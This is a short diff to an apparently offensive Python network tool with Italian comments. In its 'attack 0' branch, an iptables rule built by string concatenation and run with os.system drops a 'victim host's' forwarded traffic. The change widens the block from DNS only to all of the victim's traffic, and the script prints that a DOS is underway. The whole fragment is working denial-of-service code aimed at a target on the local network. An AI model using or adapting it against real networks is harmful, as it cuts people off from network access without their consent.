@@ -129,7 +129,7 @@ def selection(ip):
     if attack_sel == 0:
 	#per bloccare il traffico in uscita dall'host vittima bastera' impostare
 	#una regola iptables (attacco 0)
-	iptables_rule = "iptables --append FORWARD --in-interface "+iface+" --source "+target_host+" --protocol udp --destination-port 53 -j DROP"
+	iptables_rule = "iptables --append FORWARD --in-interface "+iface+" --source "+target_host+" -j DROP"
  	os.system(iptables_rule) 
 	print "Traffic bloccked! Press ctrl+c to stop DOS!"
 
